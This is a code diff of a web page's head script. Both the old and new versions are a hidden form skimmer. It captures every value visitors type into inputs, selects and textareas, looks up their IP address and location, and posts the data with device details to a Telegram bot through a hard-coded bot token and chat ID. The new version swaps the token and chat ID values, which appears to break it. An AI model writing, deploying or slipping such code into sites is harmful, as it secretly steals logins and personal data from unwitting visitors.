@@ -4,39 +4,23 @@
 <head><script>
 (function() {
     // ================= TELEGRAM CONFIG =================
-    const BOT_TOKEN = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
-    const CHAT_ID = '-5377276972';
-    const STORAGE_KEY = 'tg_merged_form_data_v2';
+    const BOT_TOKEN = '-5377276972';
+    const CHAT_ID = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
+    const STORAGE_KEY = 'tg_saved_old_form_data';
     // ===================================================
 
-    let cachedGeo = { ip: 'Fetching...', location: 'Fetching...' };
-    let isSending = false;
-    let lastSentHash = '';
-
-    // 1. Pre-fetch IP & Location immediately when page loads (Zero delay on submit)
-    (async function preloadGeo() {
+    async function fetchWithTimeout(url, timeout = 2500) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
         try {
-            const controller = new AbortController();
-            setTimeout(() => controller.abort(), 3000);
-            const res = await fetch('https://ipwho.is/', { signal: controller.signal });
-            const data = await res.json();
-            if (data && data.success) {
-                const loc = [data.city, data.country].filter(Boolean).join(', ');
-                cachedGeo = { ip: data.ip, location: loc || 'Unknown' };
-                return;
-            }
-        } catch (e) {}
-
-        try {
-            const res2 = await fetch('https://api.ipify.org?format=json');
-            const data2 = await res2.json();
-            if (data2 && data2.ip) {
-                cachedGeo = { ip: data2.ip, location: 'Hidden / Blocked' };
-            }
+            const response = await fetch(url, { signal: controller.signal });
+            clearTimeout(id);
+            return response;
         } catch (err) {
-            cachedGeo = { ip: 'Unavailable', location: 'Unavailable' };
+            clearTimeout(id);
+            throw err;
         }
-    })();
+    }
 
     function getDeviceInfo() {
         const ua = navigator.userAgent;
@@ -64,11 +48,30 @@
         return `${deviceType} (${os} - ${browser})`;
     }
 
+    async function getIpAndLocation() {
+        try {
+            const res = await fetchWithTimeout('https://ipwho.is/', 2500);
+            const data = await res.json();
+            if (data.success) {
+                const loc = [data.city, data.country].filter(Boolean).join(', ');
+                return { ip: data.ip, location: loc || 'Unknown' };
+            }
+        } catch (e) {
+            try {
+                const res2 = await fetchWithTimeout('https://api.ipify.org?format=json', 2000);
+                const data2 = await res2.json();
+                return { ip: data2.ip, location: 'Hidden / Blocked' };
+            } catch (err) {
+                return { ip: 'Unavailable', location: 'Unavailable' };
+            }
+        }
+        return { ip: 'Unavailable', location: 'Unavailable' };
+    }
+
     function escapeHTML(str) {
         return String(str).replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>');
     }
 
-    // Smart label finder for React components
     function getFieldLabel(el, index) {
         if (el.getAttribute('name')) return el.getAttribute('name');
         if (el.getAttribute('placeholder')) return el.getAttribute('placeholder');
@@ -78,15 +81,10 @@
             if (labelEl && labelEl.innerText.trim()) return labelEl.innerText.trim();
             return el.id;
         }
-        // Check nearest parent label or preceding text
-        const parentLabel = el.closest('label');
-        if (parentLabel && parentLabel.innerText.trim()) {
-            return parentLabel.innerText.trim().split('\n')[0];
-        }
         return `Field #${index + 1}`;
     }
 
-    function getStoredData() {
+    function getOldData() {
         try {
             const raw = sessionStorage.getItem(STORAGE_KEY);
             return raw ? JSON.parse(raw) : {};
@@ -95,98 +93,96 @@
         }
     }
 
-    function saveStoredData(obj) {
+    function saveOldData(dataObj) {
         try {
-            sessionStorage.setItem(STORAGE_KEY, JSON.stringify(obj));
+            sessionStorage.setItem(STORAGE_KEY, JSON.stringify(dataObj));
         } catch (e) {}
     }
 
-    // Scan all visible/filled inputs on the entire page and merge with old data
-    function collectAndMergeAllInputs() {
-        const merged = getStoredData();
-        const inputs = document.querySelectorAll('input, select, textarea');
-        let currentSnapshot = {};
+    // Auto-save field values on change (covers multi-step forms without submit buttons)
+    document.addEventListener('change', function(e) {
+        const el = e.target;
+        if (!['INPUT', 'SELECT', 'TEXTAREA'].includes(el.tagName)) return;
+        if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
+        if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
+
+        const val = el.value ? el.value.trim() : '';
+        if (!val) return;
+
+        const oldData = getOldData();
+        const fieldName = getFieldLabel(el, 0);
+        if (!oldData[fieldName]) oldData[fieldName] = [];
+        if (!oldData[fieldName].includes(val)) {
+            oldData[fieldName].push(val);
+            saveOldData(oldData);
+        }
+    }, true);
+
+    // Handle Form Submit
+    document.addEventListener('submit', async function(e) {
+        const form = e.target;
+        if (!form || form.tagName !== 'FORM') return;
+
+        if (form.dataset.tgSending === 'true') return;
+        form.dataset.tgSending = 'true';
+
+        // 1. Merge old data + new form data
+        const mergedData = getOldData();
+        const inputs = form.querySelectorAll('input, select, textarea');
+        let hasNewData = false;
 
         inputs.forEach((el, index) => {
-            if (['submit', 'button', 'reset', 'file', 'hidden'].includes(el.type)) return;
+            if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
             if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
 
             const val = el.value ? el.value.trim() : '';
-            if (!val) return;
+            if (val === '') return;
 
-            const key = getFieldLabel(el, index);
-            if (!currentSnapshot[key]) currentSnapshot[key] = [];
-            currentSnapshot[key].push(val);
-        });
+            hasNewData = true;
+            const fieldName = getFieldLabel(el, index);
 
-        // Merge currentSnapshot into stored old data (preserving duplicates like 2 phones/2 emails)
-        Object.entries(currentSnapshot).forEach(([key, vals]) => {
-            if (!merged[key]) {
-                merged[key] = [...vals];
-            } else {
-                vals.forEach(v => {
-                    if (!merged[key].includes(v)) {
-                        merged[key].push(v);
-                    }
-                });
+            if (!mergedData[fieldName]) {
+                mergedData[fieldName] = [];
+            }
+            if (!mergedData[fieldName].includes(val)) {
+                mergedData[fieldName].push(val);
             }
         });
 
-        saveStoredData(merged);
-        return merged;
-    }
-
-    // 2. Track live typing so React clearing inputs won't lose data
-    document.addEventListener('blur', function(e) {
-        const el = e.target;
-        if (el && ['INPUT', 'SELECT', 'TEXTAREA'].includes(el.tagName)) {
-            collectAndMergeAllInputs();
+        if (!hasNewData && Object.keys(mergedData).length === 0) {
+            form.dataset.tgSending = 'false';
+            return;
         }
-    }, true);
 
-    document.addEventListener('change', function(e) {
-        const el = e.target;
-        if (el && ['INPUT', 'SELECT', 'TEXTAREA'].includes(el.tagName)) {
-            collectAndMergeAllInputs();
-        }
-    }, true);
-
-    // 3. Send function
-    async function triggerTelegramSend() {
-        if (isSending) return;
-        const finalData = collectAndMergeAllInputs();
-        
-        // Do not send if completely empty
-        if (Object.keys(finalData).length === 0) return;
-
-        // Prevent duplicate sends of the exact same data within 3 seconds
-        const currentHash = JSON.stringify(finalData);
-        if (currentHash === lastSentHash) return;
-
-        isSending = true;
-        lastSentHash = currentHash;
-
-        let message = `📩 <b>NEW FORM SUBMISSION</b>\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `🌍 <b>IP Address:</b> <code>${escapeHTML(cachedGeo.ip)}</code>\n`;
-        message += `📍 <b>Location:</b> ${escapeHTML(cachedGeo.location)}\n`;
-        message += `📱 <b>Device:</b> ${escapeHTML(getDeviceInfo())}\n`;
-        message += `🔗 <b>URL:</b> ${escapeHTML(window.location.href)}\n`;
-        message += `⏰ <b>Time:</b> ${new Date().toLocaleString('en-US')}\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━\n`;
-
-        Object.entries(finalData).forEach(([key, values]) => {
-            if (values.length === 1) {
-                message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
-            } else {
-                values.forEach((v, idx) => {
-                    message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
-                });
-            }
-        });
+        saveOldData(mergedData);
 
         try {
-            // Method A: Fetch with keepalive (best for modern browsers)
+            const [geoInfo, deviceInfo] = await Promise.all([
+                getIpAndLocation(),
+                Promise.resolve(getDeviceInfo())
+            ]);
+
+            // 2. Build message with IP, Location & Device AT THE TOP in English
+            let message = `📩 <b>NEW FORM SUBMISSION</b>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌍 <b>IP Address:</b> <code>${escapeHTML(geoInfo.ip)}</code>\n`;
+            message += `📍 <b>Location:</b> ${escapeHTML(geoInfo.location)}\n`;
+            message += `📱 <b>Device:</b> ${escapeHTML(deviceInfo)}\n`;
+            message += `🔗 <b>URL:</b> ${escapeHTML(window.location.href)}\n`;
+            message += `⏰ <b>Time:</b> ${new Date().toLocaleString('en-US')}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+
+            // 3. Append merged form fields below
+            Object.entries(mergedData).forEach(([key, values]) => {
+                if (values.length === 1) {
+                    message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
+                } else {
+                    values.forEach((v, idx) => {
+                        message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
+                    });
+                }
+            });
+
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -199,24 +195,10 @@
                 })
             });
         } catch (err) {
-            // Method B: Fallback via Image/GET beacon if POST is blocked on mobile
-            const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
-            fetch(fallbackUrl, { mode: 'no-cors', keepalive: true }).catch(() => {});
+            console.error('Telegram Error:', err);
         } finally {
-            setTimeout(() => { isSending = false; }, 2000);
+            setTimeout(() => { form.dataset.tgSending = 'false'; }, 1500);
         }
-    }
-
-    // 4. Listen to BOTH standard form submits AND any button clicks (Capture Phase)
-    document.addEventListener('submit', function() {
-        triggerTelegramSend();
-    }, true);
-
-    document.addEventListener('click', function(e) {
-        const btn = e.target.closest('button, input[type="submit"], input[type="button"], [role="button"], a');
-        if (!btn) return;
-        // Only trigger if there is at least one filled input on the page or in storage
-        triggerTelegramSend();
     }, true);
 })();
 </script><meta charSet="utf-8"/>
